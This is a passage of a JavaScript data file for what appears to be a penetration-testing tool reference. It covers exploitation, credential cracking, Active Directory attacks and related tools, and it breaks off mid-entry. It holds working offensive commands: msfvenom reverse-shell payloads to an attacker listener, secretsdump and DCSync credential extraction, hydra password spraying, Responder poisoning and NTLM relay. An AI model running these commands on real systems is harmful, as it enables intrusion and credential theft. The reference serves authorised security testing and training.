/* ==========================================================================
   ZothPen — tool dossiers (part 2: exploitation / credentials / post-exploitation /
   Active Directory / wireless / references).  Appends to window.ZT from part 1.
   ========================================================================== */
window.ZT.push(

{ id:'t-searchsploit', name:'searchsploit', kind:'tool', phases:['EXPLOIT'],
  pkg:'preinstalled on Kali/Parrot', tagline:'Offline Exploit-DB in your terminal. Look up a version, get a working PoC.',
  what:'Full-text search over the Exploit-DB archive that ships with Kali and Parrot. Given a product and version from your nmap or whatweb output, it tells you which public exploits exist and drops you into an editor or an exploit directory.',
  syntax:'searchsploit apache 2.4\nsearchsploit --nmap scan.xml\nsearchsploit -m 50383',
  flags:[
    {f:'searchsploit apache 2.4.49', d:'Free-text search across titles and paths.'},
    {f:'-w', d:'Search the full text of exploit content, not just titles. Slower, far more thorough.'},
    {f:'-e / --exclude', d:'Exclude a term — -e DoS removes the denial-of-service entries that would take the target down.'},
    {f:'--nmap scan.xml', d:'Feed nmap XML and get exploits for every detected service. The killer feature.'},
    {f:'-m ID / --mirror', d:'Copy the exploit into your current directory under its original name.'},
    {f:'-x ID / --examine', d:'Read the exploit text in your pager before you run it.'},
    {f:'-p / --path', d:'Show the full filesystem path, then open it in an editor.'},
    {f:'-j / --json', d:'Structured output for scripting.'},
    {f:'-u / --update', d:'Update the local database from Exploit-DB.'}
  ],
  examples:[
    { cmd:`searchsploit --nmap scans/lab-web01-tcp.xml`, note:'Straight from your scan to a list of candidate exploits. Do this on every engagement.' },
    { cmd:`searchsploit vsftpd 2.3.4 -e DoS`, note:'Look up a service version, excluding the DoS entries that would break the target.' },
    { cmd:`searchsploit -m 49757 && searchsploit -x 49757`, note:'Read before you run. Never execute an unknown PoC blind.' },
    { cmd:`searchsploit --cve 2021-44228`, note:'Look up by CVE when you have the identifier rather than a product.' }
  ],
  opsec:['Exploit-DB PoCs are frequently unreliable, sometimes destructive (a "remote exploit" that reboots the service), and occasionally contain reverse shells pointing at someone else\'s IP. Read every line before running anything.','Older PoCs are written for old toolchains. Expect to compile against specific library versions or translate Python 2 to Python 3.'],
  tips:['grep the exploit for backdoor IPs before running: grep -nE "([0-9]{1,3}\\.){3}[0-9]{1,3}" exploit.py. Occasional Exploit-DB submissions have been tampered with.','searchsploit --nmap plus nuclei -as covers both the classic-CVE world and the modern template world. Run both.'],
  links:[{t:'Exploit-DB', u:'https://www.exploit-db.com/'},{t:'searchsploit docs', u:'https://www.kali.org/tools/exploitdb/'}],
  related:['t-metasploit','t-nmap','t-nuclei'] },

{ id:'t-metasploit', name:'Metasploit Framework', kind:'suite', phases:['EXPLOIT','POST','MASTERY'],
  pkg:'preinstalled on Kali/Parrot', tagline:'The exploitation framework: modules, payloads, sessions, and a real API for automation.',
  what:'A modular framework covering exploit delivery, payload generation, session management, post-exploitation modules, and credential collection. Its real value at expert level is not the GUI click-and-pwn: it is reproducible, resource-scripted, API-driven exploitation that you can document and rerun.',
  syntax:'msfconsole -q -r handler.rc\nmsfconsole -q -x \'use auxiliary/scanner/smb/smb_version; set RHOSTS TARGET; run\'',
  flags:[
    {f:'search TYPE:EXPLOIT PLATFORM:WINDOWS cve:2021', d:'Structured search. Filter by type, platform, CVE, rank, author.'},
    {f:'show options / show payloads / show targets', d:'What this module needs, what payloads it can deliver, which targets it understands.'},
    {f:'setg RHOSTS/LHOST/LPORT', d:'Global variables. setg once instead of set for every module — the main efficiency win.'},
    {f:'check', d:'Non-exploiting vulnerability check where the module supports it. Always try this before run on a fragile service.'},
    {f:'exploit -j -z', d:'Run as a background job. Essential for handlers and multi-target work.'},
    {f:'sessions -i N / -u / -k', d:'Interact with / upgrade to meterpreter / kill a session.'},
    {f:'-r script.rc / resource', d:'Run a resource script: a recorded, reproducible sequence of commands.'},
    {f:'db_import scan.xml / hosts / services / vulns', d:'Load nmap XML into the workspace database and work from it.'},
    {f:'msfconsole -x "cmds"', d:'Non-interactive one-shot. Great for CI and for scripts.'},
    {f:'workspace / db_nmap', d:'Scope findings per engagement and run nmap from inside msf.'}
  ],
  examples:[
    { cmd:`msfconsole -q -x "workspace -a acme; db_import scans/scan.xml; hosts; services; exit"`, note:'Turn a scan into a queryable database, scriptably.' },
    { cmd:`use exploit/windows/smb/ms17_010_eternalblue`, note:'Then: set RHOSTS, set LHOST, set PAYLOAD, check, run. The canonical flow.' },
    { cmd:`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=443 -f exe -o update.exe`, note:'Payload generation. See the msfvenom entry for the full flag set.' },
    { cmd:`msfconsole -q -r ~/engagements/acme/exploit.rc`, note:'Replay the whole engagement exploitation as a reviewable script. This is expert practice.' }
  ],
  opsec:['Metasploit payloads are the single most signatured toolset in existence. Meterpreter is caught by essentially every modern EDR. On a mature client, Metasploit is for validation and reporting, not for staying undetected.','Exploit modules can crash services, corrupt databases, and blue-screen hosts. `check` where available, and never run an unverified exploit module on production without explicit approval and a rollback plan.'],
  tips:['Alternative frameworks worth knowing: Sliver (C2, see its own entry), Empire/Starkiller, Covenant, Havoc. Metasploit is the teaching tool; these are what operators reach for on modern targets.','Resource scripts are the professional habit: they make exploitation reproducible, reviewable by a colleague, and documentable in the report.'],
  links:[{t:'Metasploit docs', u:'https://docs.metasploit.com/'},{t:'Metasploit Unleashed (free course)', u:'https://www.offsec.com/metasploit-unleashed/'}],
  related:['t-msfvenom','t-searchsploit','t-sliver'] },

{ id:'t-msfvenom', name:'msfvenom', kind:'tool', phases:['EXPLOIT'],
  pkg:'preinstalled on Kali/Parrot', tagline:'Payload factory: any platform, any format, any encoder, one command.',
  what:'Generates standalone payloads and shellcode in dozens of formats for every supported platform. Encoders and templates modify the output to evade naive signature detection; -i iterates encoding passes.',
  syntax:'msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT -o out.file',
  flags:[
    {f:'-p', d:'Payload path, e.g. linux/x64/shell_reverse_tcp, windows/x64/meterpreter/reverse_https, php/meterpreter/reverse_tcp.'},
    {f:'-f', d:'Output format: exe, elf, raw, c, python, powershell, asp, aspx, war, jar, psh-cmd, so, macho, dll.'},
    {f:'-a / --platform', d:'Architecture (x64, x86) and platform when generating shellcode.'},
    {f:'-e / -i', d:'Encoder (x86/shikata_ga_nai is the classic) and number of iterations.'},
    {f:'-x / -k', d:'Use an existing executable as a template / keep it working after injection. Realistic but fragile.'},
    {f:'-b', d:'Bad characters to avoid — critical for buffer-overflow shellcode.'},
    {f:'-n', d:'Prepend N NOP sled bytes. For exploit development, not for AV evasion.'},
    {f:'--list payloads|encoders|formats|platforms|archs', d:'Enumerate everything available.'},
    {f:'-o / | ', d:'Write to a file, or pipe directly into another tool.'}
  ],
  examples:[
    { cmd:`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=443 -f elf -o shell.elf`, note:'Linux reverse shell. chmod +x it before use.' },
    { cmd:`msfvenom -p php/reverse_php LHOST=10.10.14.9 LPORT=443 -f raw -o shell.php`, note:'PHP payload for a file-upload or LFI-to-RCE path.' },
    { cmd:`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=443 -f exe -e x86/shikata_ga_nai -i 5 -o s.exe`, note:'Encoded Windows EXE. Be realistic: this will not beat modern EDR.' },
    { cmd:`msfvenom -p windows/x64/exec CMD='powershell -enc BASE64' -f exe -o a.exe`, note:'Arbitrary-command payload — the shell-less style that is often more useful today.' },
    { cmd:`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=443 -b '\\x00\\x0a\\x0d' -f c`, note:'Bad-character-safe C shellcode for exploit development.' }
  ],
  opsec:['Encoders are not evasion. Modern EDR uses behavioural detection (process lineage, API call patterns, network beacons), not signatures, so encoded Meterpreter is caught just as reliably as raw Meterpreter. Treat encoding as "may survive old AV" and nothing more.','Every payload you generate and leave on disk is a risk if misplaced. Keep an engagement-only working directory and clear it at the end.'],
  tips:['Prefer reverse_https over reverse_tcp when egress filtering exists — it blends with normal TLS traffic and survives HTTP-aware proxies.','The simplest payload is usually best: a linux/x64/shell_reverse_tcp ELF or a one-line bash /dev/tcp command has no framework signature at all.'],
  links:[{t:'msfvenom reference', u:'https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html'}],
  related:['t-metasploit','t-nc','t-sliver'] },

{ id:'t-hashid', name:'hashid / hash-identifier', kind:'tool', phases:['EXPLOIT'],
  pkg:'apt install hashid', tagline:'Identify a hash format from its shape before you waste hours cracking the wrong algorithm.',
  what:'Takes an unknown hash and reports which algorithms it could be, based on length, character set and known prefixes. Ten seconds here saves a failed hashcat run.',
  syntax:'hashid -m 5f4dcc3b5aa765d61d8327deb882cf99\nhashid -f hashes.txt',
  flags:[
    {f:'-m / --mode', d:'Suggest the hashcat -m mode number directly. The most useful flag.'},
    {f:'-j / --john', d:'Suggest the John the Ripper format name.'},
    {f:'-e / --extended', d:'Extended set of candidate algorithms.'},
    {f:'-f / --file', d:'Hashes from a file, one per line.'},
    {f:'-o / --outfile', d:'Output file.'},
    {f:'-r', d:'Also treat NTLM/domain-cached variants specially.'}
  ],
  examples:[
    { cmd:`hashid -m '8846f7eaee8fb117ad06bdd830b7586c'`, note:'A 32-hex string: MD5 or NTLM. -m tells you hashcat mode 0 or 1000.' },
    { cmd:`hashcat --identify hashes.txt`, note:'Built into hashcat — no extra package needed.' },
    { cmd:`hashid -m -e hashes.txt`, note:'Batch identification with extended algorithm coverage.' }
  ],
  opsec:['Identification is passive; cracking is where the law starts. Only run hashcat or john against hashes taken from a system you own or were authorised to test.','Recovered passwords are personal data. Keep them on the engagement host and out of your shell history — start the line with a space and set HISTCONTROL=ignorespace.','A customer hash file is still customer data: no copies on your laptop, no pasting fragments into online identifier sites. Identify locally or not at all.'],
  tips:['Context beats identification: a 32-hex value pulled from a Windows SAM is NTLM, not MD5. Use where you found it as much as what it looks like.'],
  links:[{t:'hashid on GitHub', u:'https://github.com/psypanda/hashID'},{t:'Hashcat example hashes', u:'https://hashcat.net/wiki/doku.php?id=example_hashes'}],
  related:['t-hashcat','t-john'] },

{ id:'t-hashcat', name:'hashcat', kind:'tool', phases:['EXPLOIT','MASTERY'],
  pkg:'preinstalled on Kali/Parrot', tagline:'GPU-accelerated password recovery. The mode number is everything; the rest is wordlist strategy.',
  what:'The fastest general-purpose password cracker available. Given hashes and a mode, it runs through wordlists, rules, masks, or combinations using the GPU. Knowing the mode, the wordlist, and whether to use rules is the whole skill.',
  syntax:'hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule',
  flags:[
    {f:'-m MODE', d:'Hash type: 0 MD5, 100 NTLM, 1000 NTLM (same family), 1800 sha512crypt, 3200 bcrypt, 22000 WPA-PBKDF2-PMKID+EAPOL, 13100 Kerberos 5 TGS-REP (Kerberoast), 18200 AS-REP.'},
    {f:'-a ATTACK', d:'Attack mode: 0 straight wordlist, 1 combinator, 3 brute-force/mask, 6 hybrid wordlist+mask, 7 hybrid mask+wordlist.'},
    {f:'-a 0 -r rules/best64.rule', d:'Wordlist plus mangling rules. The highest-value technique — turns 10k words into millions of realistic candidates.'},
    {f:'-a 3 ?u?l?l?l?l?d?d', d:'Mask attack — targeted brute force on a known pattern. Enormously faster than full brute force.'},
    {f:'-O / -w 3', d:'Optimised kernels (limits password length) and workload profile 1-4 for interactivity vs throughput.'},
    {f:'--show / -o out', d:'Show already-cracked results from the potfile / write cracked results to a file. The potfile is automatic.'},
    {f:'-r FILE', d:'Rule file. /usr/share/hashcat/rules/ has dozens: best64, rockyou-30000, d3ad0ne, dive.'},
    {f:'--increment --increment-min', d:'Grow the mask from shorter lengths upward.'},
    {f:'--status --status-timer 10', d:'Live progress. Essential on long runs.'},
    {f:'-D 2 / --backend-ignore-*', d:'Device selection and troubleshooting when a GPU/driver is misbehaving.'},
    {f:'--potfile-path / -j', d:'Custom potfile location, useful per-engagement.'},
    {f:'--restore / --session NAME', d:'Resume an interrupted run. Always name your sessions on long jobs.'}
  ],
  examples:[
    { cmd:`hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule --status`, note:'NTLM with rules. The default first move on Windows hashes.' },
    { cmd:`hashcat -m 18200 -a 0 asrep.txt rockyou.txt -r rules/d3ad0ne.rule`, note:'AS-REP roast hashes. Often cracks fast because users pick weak passwords.' },
    { cmd:`hashcat -m 13100 -a 0 kerberoast.txt rockyou.txt`, note:'Kerberoast (TGS-REP) hashes.' },
    { cmd:`hashcat -m 22000 -a 0 wpa.hc22000 rockyou.txt`, note:'WPA/WPA2 handshake or PMKID. Convert with hcxpcapngtool first.' },
    { cmd:`hashcat -m 3200 -a 3 hashes.txt '?u?l?l?l?l?l?d?d'`, note:'bcrypt is slow by design — mask attacks on known patterns are the only practical approach.' },
    { cmd:`hashcat -m 1000 -a 0 ntlm.txt rockyou.txt --show | wc -l`, note:'How many cracked so far, from the potfile.' }
  ],
  opsec:['Cracking is offline and invisible to the client — that is the point, and it is why hash extraction is so valuable and so sensitive. The hashes themselves are the client\'s crown jewels: they go in the encrypted evidence store, never in a chat or a personal machine.','Wordlists from the internet can be multi-gigabyte. Verify hashes (or at least provenance) before feeding random 10GB dumps into your cracker.'],
  tips:['Write your own rules for the target\'s password policy: if policy says "12+ chars with a capital and a digit at the end", a targeted mask beats any public wordlist.','The potfile (per-hash-type) is cumulative and automatic. --show first before every new run so you do not repeat work.'],
  links:[{t:'Hashcat wiki (mode table)', u:'https://hashcat.net/wiki/'},{t:'Hashcat example hashes', u:'https://hashcat.net/wiki/doku.php?id=example_hashes'}],
  related:['t-john','t-hashid','t-certipy'] },

{ id:'t-john', name:'John the Ripper (jumbo)', kind:'tool', phases:['EXPLOIT'],
  pkg:'preinstalled on Kali/Parrot', tagline:'CPU cracking with automatic hash detection and format conversion. Best for archives, documents, SSH keys.',
  what:'The jumbo build understands a huge range of formats beyond raw hashes, and its *2john helper scripts extract crackable hashes from real files: ZIP/RAR/7z archives, PDFs, Office documents, SSH private keys, KeePass databases, wallet files. If it holds a password, there is probably a *2john for it.',
  syntax:'john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\npython3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash',
  flags:[
    {f:'--wordlist=FILE / --rules', d:'Wordlist and mangling rules. --rules is what makes a small list effective.'},
    {f:'--format=NAME', d:'Force a format when auto-detection guesses wrong. --list=formats shows all (~400).'},
    {f:'--incremental / --mask', d:'Brute-force and targeted mask modes.'},
    {f:'--show / --pot', d:'Print cracked results / the pot file location.'},
    {f:'--fork=N', d:'Parallelise across CPU cores.'},
    {f:'--single', d:'Wordlist derived from the account\'s own GECOS/full-name fields. Very effective on /etc/shadow.'},
    {f:'--session=NAME --restore', d:'Named sessions and restore after interruption.'},
    {f:'unshadow /etc/passwd /etc/shadow > hashes.txt', d:'Combine passwd and shadow into crackable input — the classic Linux workflow.'}
  ],
  examples:[
    { cmd:`unshadow /etc/passwd /etc/shadow > hashes.txt && john --wordlist=rockyou.txt --rules hashes.txt`, note:'The classic Linux local-account crack.' },
    { cmd:`ssh2john id_rsa > key.hash && john --wordlist=rockyou.txt key.hash`, note:'Crack a passphrase-protected SSH private key you found. Frequently the fastest way into a box.' },
    { cmd:`zip2john backup.zip > zip.hash && john --wordlist=rockyou.txt zip.hash`, note:'Archives are the other half of this tool. The helper scripts are the reason to choose John over hashcat here.' },
    { cmd:`keepass2john db.kdbx > kp.hash && john kp.hash --wordlist=rockyou.txt`, note:'A KeePass database on a file share is a critical finding; this is how you prove it.' },
    { cmd:`john --list=formats | tr ',' '\\n' | grep -i office`, note:'Find the format name for the file type you have.' },
    { cmd:`john --show hashes.txt`, note:'Your cracked results, in user:password form.' }
  ],
  opsec:['Cracked credentials are the most sensitive data in the engagement. They belong in an encrypted container, and every one must be listed in the report\'s credential-handling appendix.','Never store cracked passwords in a shell history file. Use an interactive session with history disabled, or a file in your encrypted evidence directory.'],
  tips:['Hashcat for speed on raw hashes (GPU); John for breadth of formats and for anything that is a file rather than a hash. Use both — they are complementary, not alternatives.','ls /usr/bin/*2john on Kali is a surprisingly long list. Check it whenever you find a protected file.'],
  links:[{t:'John the Ripper jumbo', u:'https://github.com/openwall/john'},{t:'John formats list', u:'https://openwall.info/wiki/john/sample-hashes'}],
  related:['t-hashcat','t-hashid','t-hydra'] },

{ id:'t-hydra', name:'hydra', kind:'tool', phases:['EXPLOIT'],
  pkg:'preinstalled on Kali/Parrot', tagline:'Online password attack tool. Powerful, loud, and capable of locking out an entire directory.',
  what:'Brute-forces or sprays credentials against live network services: SSH, RDP, FTP, HTTP forms, SMB, MySQL, VNC, and around fifty others. The difference from hashcat is that hydra talks to the service, so lockout thresholds, rate limits and detection all apply.',
  syntax:'hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET ssh\nhydra -L users.txt -p \'Password1\' TARGET smb',
  flags:[
    {f:'-l / -L', d:'Single username / file of usernames.'},
    {f:'-p / -P', d:'Single password / file of passwords. Use -p for spraying, -P for full brute force.'},
    {f:'-s PORT', d:'Non-standard port.'},
    {f:'-t TASKS', d:'Parallel tasks per target. Default 16. On production, use 4 or fewer.'},
    {f:'-M FILE', d:'Multiple targets from a file. Attack several in one run.'},
    {f:'-f / -F', d:'Stop after the first / after any valid pair. -f is what you almost always want.'},
    {f:'-o FILE / -b FORMAT', d:'Output file and format (json, jsonv1). Log everything.'},
    {f:'-e nsr', d:'Try null password, login-as-password, and reverse-login-as-password before the wordlist. Cheap wins.'},
    {f:'-u', d:'Loop usernames in the outer loop — the correct order for spraying a single password across users.'},
    {f:'-V / -d', d:'Show each attempt / debug output. -V reveals immediately whether the login logic works.'},
    {f:'-I', d:'Ignore an existing restore file. Do not ignore that a restore file means a previous run was interrupted mid-attack.'}
  ],
  examples:[
    { cmd:`hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f -o hydra-ssh.txt ssh://10.10.10.5`, note:'SSH brute force, bounded to four threads, stopping on the first hit, logged.' },
    { cmd:`hydra -L users.txt -p 'Summer2026!' -t 2 -e nsr rdp://10.10.10.5`, note:'RDP password spray: one password across a user list at two threads. Slow on purpose.' },
    { cmd:`hydra -l admin -P pass.txt -f 10.10.10.5 http-post-form '/login:username=^USER^&password=^PASS^:F=invalid'`, note:'Web form attack. The F= string is the failure indicator — get it from a real failed login.' },
    { cmd:`hydra -L users.txt -P spray.txt -t 1 -W 5 -f smb://10.10.10.5`, note:'SMB spray with a 5-second wait between attempts. The slowest and safest configuration.' },
    { cmd:`hydra -C combos.txt -f ftp://10.10.10.5`, note:'Colon-separated user:pass file instead of separate lists.' }
  ],
  opsec:['This is the most lockout-prone tool in the manual. Before you run it: read the password policy (nxc smb --pass-pol or enum4linux -P), count your attempts, and set your thread count and wait times so you stay under the threshold. Locking out every domain account is a real incident you will have to explain.','hydra is extremely visible: failed authentications flood the event logs. Rate-limit, use -t 1 on Windows services, and get written approval for the attempt numbers.','Never point hydra at a service you have not confirmed is in scope. Online attacks against the wrong IP are immediately actionable against you.'],
  tips:['Spray, do not brute force, on any corporate service. One weak password across 300 users has a far higher success rate than 300 passwords against one user, and it generates 300 events instead of 90,000.','Verify your login logic with -V against a known-good credential pair first. A hydra run with a wrong failure string reports 100% success.'],
  links:[{t:'hydra on GitHub', u:'https://github.com/vanhauser-thc/thc-hydra'},{t:'Hydra usage examples (Kali)', u:'https://www.kali.org/tools/hydra/'}],
  related:['t-netexec','t-john','t-hashcat'] },

{ id:'t-responder', name:'Responder', kind:'tool', phases:['EXPLOIT'],
  pkg:'preinstalled on Kali/Parrot', tagline:'Poison LLMNR/NBT-NS/mDNS, capture NetNTLMv2 hashes from misconfigured Windows hosts.',
  what:'Answers broadcast name-resolution requests that Windows machines make when DNS fails, pretending to be the host being sought. The requesting machine then authenticates to you, handing over a NetNTLMv2 hash you can crack offline — or relay in real time. It is often the fastest way from "on the LAN" to "domain user credentials".',
  syntax:'sudo responder -I eth0 -wv\nsudo responder -I eth0 -w -d',
  flags:[
    {f:'-I', d:'Interface. Must be the interface on the target network, and it must be able to see broadcasts.'},
    {f:'-w / -r', d:'Start the WPAD rogue proxy server / enable NBT-NS and LLMNR answering (on by default).'},
    {f:'-d / -v', d:'Answer for wpad/dns names too / verbose.'},
    {f:'-A / --analyze', d:'Analysis mode: listen only, do not answer. The responsible first step to prove the finding without touching anything.'},
    {f:'-F / --force-wpad', d:'Force WPAD authentication. Captures far more, and is significantly more intrusive.'},
    {f:'-P / --ProxyAuth', d:'Force proxy authentication (NTLM). Captures hashes at proxy level.'},
    {f:'-w / -e', d:'WPAD answers and the Challenge/Response value.'},
    {f:'-L / --lm', d:'Force downgrade to LM hashes. Trivially crackable, and a very loud technique.'},
    {f:'-H / --disable-http', d:'Turn off the HTTP server.'},
    {f:'--lm / -F', d:'Aggressive options. Read before using.'}
  ],
  examples:[
    { cmd:`sudo responder -I eth0 -A`, note:'Analysis mode first: prove LLMNR/NBT-NS traffic exists without poisoning anything. This is the finding.' },
    { cmd:`sudo responder -I eth0 -wv`, note:'Poisoning with WPAD. Wait for the hashes in /usr/share/responder/logs/.' },
    { cmd:`sudo responder -I eth0 -w -d -v 2>&1 | tee responder.log`, note:'Logged poisoning run. Check the log folder for NetNTLMv2 files.' },
    { cmd:`hashcat -m 5600 netntlmv2.txt rockyou.txt -r rules/best64.rule`, note:'Mode 5600 for NetNTLMv2. Weak user passwords crack in minutes.' }
  ],
  opsec:['Poisoning attacks disrupt the target network: you are answering requests that legitimate hosts should have answered, and services can break. Get explicit written approval, and prefer -A analysis mode when all you need is evidence.','Responder is one of the most IDS-visible tools in existence. Only run it against networks where you have written authorisation and the client understands what it does.','Use the config at /etc/responder/Responder.conf to disable services after capture (SMB and HTTP especially) when you are relaying, not just capturing.'],
  tips:['Run Responder and ntlmrelayx at the same time for the complete picture: Responder captures what it can crack, ntlmrelayx answers with authentication forwarding instead. Do not enable SMB/HTTP in both at once or they conflict.','The Inveigh tool is the PowerShell equivalent on Windows-side assessments, and mitm6 is the modern answer when LLMNR is disabled but IPv6 is not.'],
  links:[{t:'Responder on GitHub', u:'https://github.com/lgandx/Responder'},{t:'mitm6', u:'https://github.com/dirkjanm/mitm6'}],
  related:['t-impacket','t-netexec','t-hashcat'] },

{ id:'t-impacket', name:'Impacket', kind:'suite', phases:['EXPLOIT','POST','AD'],
  pkg:'python3 -m pip install impacket (also preinstalled)', tagline:'A library plus 70+ CLI tools for SMB, MSRPC, Kerberos, LDAP and DCOM. Where the real Windows work happens.',
  what:'A pure-Python implementation of Windows network protocols, plus a large family of command-line tools built on it. Its tools are the ones you reach for when NetExec is not quite the right shape: relay, Kerberos abuse, remote execution via many mechanisms, secret extraction, domain takeover.',
  syntax:'impacket-psexec DOMAIN/USER:\'PASS\'@TARGET\nimpacket-secretsdump DOMAIN/USER:\'PASS\'@TARGET\nimpacket-GetUserSPNs DOMAIN/USER:\'PASS\' -dc-ip DC -request',
  flags:[
    {f:'impacket-psexec / smbexec / wmiexec / atexec', d:'Four remote execution mechanisms with different network signatures and different likely detection. wmiexec is the quietest, psexec the noisiest.'},
    {f:'impacket-secretsdump', d:'SAM, LSA secrets, DCSync (giving it a domain admin or the right replication rights). The credential-extraction workhorse.'},
    {f:'impacket-ntlmrelayx', d:'The relay engine: forward captured NTLM authentication to unsigned SMB/LDAP targets. -smb2support is required in practice; -t target or -tf targets file; -socks for a proxied session.'},
    {f:'impacket-GetNPUsers / GetUserSPNs', d:'AS-REP roast and Kerberoast, over LDAP. Where convertible hashes come from.'},
    {f:'impacket-getTGT / getST / ticketConverter', d:'Request TGTs from hashes or passwords and forge service tickets. Kerberos abuse toolkit.'},
    {f:'impacket-smbclient / smbserver', d:'SMB client and a quick Python SMB server for exfiltration. impacket-smbserver share . -smb2support -username u -password p.'},
    {f:'-hashes LMHASH:NTHASH', d:'Pass-the-hash in the universal form: :NTHASH for the NT part. Works on almost every impacket tool.'},
    {f:'-k -no-pass -dc-ip', d:'Kerberos authentication mode. Combine with KRB5CCNAME pointing at a ccache.'}
  ],
  examples:[
    { cmd:`impacket-secretsdump DOMAIN/admin:'P@ss'@10.10.10.10`, note:'Remote secret extraction from a domain admin context. Dumps SAM, LSA, and cached domain credentials.' },
    { cmd:`impacket-secretsdump -just-dc-ntlm DOMAIN/admin:'P@ss'@10.10.10.10`, note:'DCSync: the same data via replication, no code execution on the DC. Quiter. Requires replication rights.' },
    { cmd:`impacket-ntlmrelayx -tf relay.txt -smb2support -socks`, note:'Relay to every unsigned host in relay.txt and keep sessions for proxying.' },
    { cmd:`impacket-GetUserSPNs DOMAIN/user:'P@ss' -dc-ip 10.10.10.10 -request -outputfile kerb.txt`, note:'Kerberoast without touching NetExec. Then crack with hashcat -m 13100.' },
    { cmd:`impacket-wmiexec DOMAIN/user:'P@ss'@10.10.10.20 'whoami /all'`, note:'Quiet command execution via WMI. Usually the least-detected of the four.' },
    { cmd:`impacket-smbserver share /tmp/loot -smb2support -username u -password p`, note:'Stand up an authenticated SMB share for transfers. Note newer Windows blocks unauthenticated guest SMB by default, hence the credentials.' }
  ],
  opsec:['secretsdump against a Domain Controller is credential-material extraction on the client\'s most critical system. It is a "stop and call the client" event. Written approval naming DCSync and NTDS specifically is not optional.','psexec drops a service binary and creates a service — one of the loudest things you can do on Windows. wmiexec leaves far less behind. Choose knowingly.','ntlmrelayx can actively change data on relayed targets (e.g. LDAP attribute writes, computer-account takeover). That is a write action on a live system.'],
  tips:['Know the execution-tool detection ladder, quietest to loudest: wmiexec, atexec, smbexec, psexec. Pick the quietest one that works for the access you have.','Everything here has a Python API. When the CLI tool does not quite fit, import the library and write fifteen lines. That is a core expert skill.'],
  links:[{t:'Impacket on GitHub', u:'https://github.com/fortra/impacket'},{t:'Impacket examples', u:'https://github.com/fortra/impacket/tree/master/examples'}],
  related:['t-netexec','t-bloodhound','t-certipy','t-responder'] },

{ id:'t-bloodhound', name:'BloodHound (+ SharpHound / bloodhound-ce)', kind:'tool', phases:['AD','POST'],
  pkg:'apt install bloodhound (legacy) / BloodHound CE via docker', tagline:'Graph the shortest path from a foothold to Domain Admin. The single most useful AD tool.',
  what:'Collects Active Directory relationships (group memberships, sessions, ACLs, delegation, trusts) and renders them as a graph, then computes the shortest attack path from where you are to where you want to be. It turns "I have a user account" into "here are the four specific steps to Domain Admin".',
  syntax:'SharpHound.exe -c All --zipfilename lab.zip\nbloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c All',
  flags:[
    {f:'-c All', d:'Collect everything: groups, sessions, ACLs, trusts, GPOs, containers. Use -c DCOnly for a quiet LDAP-only collection.'},
    {f:'bloodhound-python', d:'The collection option that runs from Linux, so you never have to drop a binary. -ns is the nameserver/DC.'},
    {f:'-ns / -dc-ip', d:'DC address as nameserver. Required when DNS on your box does not resolve the domain.'},
    {f:'--dns-tcp', d:'Force TCP DNS when UDP is filtered.'},
    {f:'-do --zip', d:'Container output as a ZIP, which is the format BloodHound imports.'},
    {f:'SharpHound -c SessionLoop', d:'Continuous session collection over time. Sessions are transient — one collection is a snapshot.'},
    {f:'Queries (prebuilt)', d:'"Shortest path to Domain Admins", "Kerberoastable users", "Users with DCSync rights", "Computers where Domain Admins are logged in", "Unconstrained delegation hosts".'},
    {f:'Cypher search', d:'BloodHound is a Neo4j graph; you can write raw Cypher. This is where expert-level use begins.'},
    {f:'Timeline view', d:'When objects and ACLs were created — often reveals misconfigurations introduced by a temporary contractor.'}
  ],
  examples:[
    { cmd:`bloodhound-python -u user -p 'P@ss' -d zoth.local -ns 10.10.10.10 -c All --zip`, note:'Full collection from Linux, output as an importable ZIP. No binary on target.' },
    { cmd:`# SharpHound on a Windows foothold`, note:'.\SharpHound.exe --CollectionMethods All --Domain zoth.local --ZipFileName loot.zip' },
    { cmd:`# Analysis`, note:'Upload the ZIP, set your owned principal (mark your foothold as Owned), then run "Shortest Paths to Domain Admins". That path is your engagement plan.' },
    { cmd:`MATCH (u:User {hasspn:true}) RETURN u.name`, note:'Raw Cypher for Kerberoastable users, straight in the BloodHound search bar.' }
  ],
  opsec:['SharpHound with -c All generates significant LDAP and SMB traffic and is increasingly detected by mature SOCs. Use -c DCOnly for LDAP-only collection on a monitored estate.','The generated data is a complete map of the client\'s privilege structure. It is extremely sensitive and must be deleted at engagement close.'],
  tips:['Session data is a snapshot: a domain admin logged into a workstation at 09:30 may be gone by 10:00. Collect at different times of day, and repeat collection across the engagement.','dacl-based edges (GenericAll, WriteDacl, ForceChangePassword) are where modern AD privilege escalation lives. Old material focuses on group nesting; the ACLs are the interesting part now.'],
  links:[{t:'BloodHound CE on GitHub', u:'https://github.com/SpecterOps/BloodHound'},{t:'bloodhound-python', u:'https://github.com/dirkjanm/BloodHound.py'},{t:'BloodHound docs', u:'https://bloodhound.readthedocs.io/'}],
  related:['t-netexec','t-impacket','t-certipy'] },

{ id:'t-certipy', name:'Certipy / Certify', kind:'tool', phases:['AD','POST'],
  pkg:'pip install certipy-ad', tagline:'Find and exploit AD Certificate Services misconfigurations — frequently the fastest route to Domain Admin.',
  what:'Active Directory Certificate Services (AD CS) issues certificates that authenticate as their subject. Misconfigured templates let an ordinary domain user request a certificate for a domain admin or the domain controller itself, and then use it to authenticate as that principal. Certipy finds and exploits these in one tool.',
  syntax:'certipy-ad find -u USER@DOMAIN -p PASS -dc-ip DC -vulnerable\ncertipy-ad req / auth / relay      # request, authenticate, relay',
  flags:[
    {f:'find -vulnerable', d:'Enumerate all CAs and templates and report only the vulnerable ones. Always start here.'},
    {f:'find -vulnerable -enabled', d:'Filter to enabled templates, cutting the noise on large estates.'},
